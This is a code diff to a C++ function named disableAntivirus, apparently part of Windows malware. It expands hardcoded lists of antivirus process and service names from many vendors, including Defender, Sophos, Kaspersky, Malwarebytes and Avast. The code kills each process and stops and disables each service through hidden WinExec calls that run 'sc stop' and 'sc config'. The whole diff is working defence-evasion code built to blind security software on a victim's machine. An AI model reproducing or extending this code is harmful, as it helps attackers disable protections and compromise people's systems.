@@ -1328,20 +1328,42 @@ void disableAntivirus() {
     // Kill common AV processes
     const char* avProcs[] = {"MsMpEng.exe","NisSrv.exe","avguard.exe","avastsvc.exe","avgrsa.exe","egui.exe",
         "ekrn.exe","bdagent.exe","SophosUI.exe","ccSvcHst.exe","vsserv.exe","kavfs.exe","AVGSvc.exe",
-        "FortiClient.exe","mfemms.exe","mfevtps.exe","mbam.exe","mbamservice.exe","WRSA.exe"};
+        "FortiClient.exe","mfemms.exe","mfevtps.exe","mbam.exe","mbamservice.exe","WRSA.exe",
+        "MBAMService.exe","MBAMProtect.exe","MWAC.exe","MpCmdRun.exe","AdAwareService.exe",
+        "surfshark.exe","CMAK.exe","VCLwarp.exe","avp.exe","avpui.exe","kavtray.exe","kavfs.exe",
+        "KSDE.exe","EGUI.exe","EHttpSrv.exe","ekrn.exe","fshoster32.exe","fsma32.exe","fsorsp.exe",
+        "fsav32.exe","fscuif.exe","fsgk32.exe","fsm32.exe","F-Secure.exe","pavsrv.exe","pavfires.exe",
+        "PavFnSvr.exe","pavkre.exe","pavsrv51.exe","pavwsc.exe","PSUAService.exe","pavbckpt.exe",
+        "PSUAMain.exe","Sophos.exe","SophosFS.exe","SophosSA.exe","SAVAdminService.exe",
+        "SAVService.exe","savscan.exe","SavMain.exe","SavProgress.exe","SophosUI.exe",
+        "WRSA.exe","WRSVC.exe","webroot.exe","WRSA.exe","wsb-exchange.exe","MBAM.exe",
+        "mbamgui.exe","mbampt.exe","mbamscheduler.exe","mbamswissarmy.exe","mbamext.exe",
+        "mbamantimalware.exe","mbamdownloader.exe","mbaminstaller.exe","mbamservice.exe",
+        "avg.exe","avgrsa.exe","avgcsrva.exe","avgcc.exe","avgidsagent.exe","avgwdsvc.exe",
+        "avgnsx.exe","avgemin.exe","avgtray.exe","avgui.exe","AVGSvc.exe","avastui.exe",
+        "avastsvc.exe","AvastSvc.exe","aswEngSrv.exe","aswidsagenta.exe","aswFe.exe","aswSvc.exe"};
 
     // Stop common AV services
     const char* avSvcs[] = {"WinDefend","Sense","MsMpEng","NisSrv","wscsvc","SecurityHealthService",
         "AvastAntivirus","AVG","Avira","McAfeeEngineService","McAfeeFramework","McAfeeMcShield",
         "Kaspersky","BitDefender","ESET","Malwarebytes","Sophos","TrendMicro","Norton","FortiClient",
-        "Webroot","Panda","Comodo","VIPRE","Emsisoft","F-Secure"};
+        "Webroot","Panda","Comodo","VIPRE","Emsisoft","F-Secure","MBAMService","MBAMProtector",
+        "MBAMSwissArmy","MBAMWebAccessControl","AdAwareService","Surfshark","IObit","Spybot",
+        "SpybotSearchDestroyer","SUPERAntiSpyware","AntiSpyware","WindowsDefender","WDService",
+        "WDBoot","WdNisSvc","WdFilter","Sense","KAVFS","KAVFSK","KAVFSMP","ESETService","eamonm",
+        "ekrn","egui","ehdrv","ewplo","fshoster","fsma32","fsorsp","fsav32","fscuif","fsgk32",
+        "fsm32","F-Secure","pavsrv","pavfires","PavFnSvr","pavkre","pavsrv51","pavwsc","PSUAService",
+        "pavbckpt","PSUAMain","Sophos","SophosFS","SophosSA","SAVAdmin","SAVService","savscan",
+        "SavMain","SavProgress","SophosUI","WRSA","WRSVC","webroot","WRSA","wsb-exchange",
+        "AVG Antivirus","AVG","AVGSA","AVGIDS","AVGWD","Avast","AvastSvc","aswEngSrv",
+        "aswidsagenta","aswFe","aswSvc"};
 
     for (const char* p : avProcs) killProcessByName(p);
     for (const char* s : avSvcs) {
-        std::string cmd = "sc stop " + std::string(s) + " 2>nul";
-        system(cmd.c_str());
-        cmd = "sc config " + std::string(s) + " start= disabled 2>nul";
-        system(cmd.c_str());
+        std::string cmd = "cmd.exe /c sc stop " + std::string(s) + " 2>nul";
+        WinExec(cmd.c_str(), SW_HIDE);
+        cmd = "cmd.exe /c sc config " + std::string(s) + " start= disabled 2>nul";
+        WinExec(cmd.c_str(), SW_HIDE);
     }
 
     // Disable Windows Defender specifically
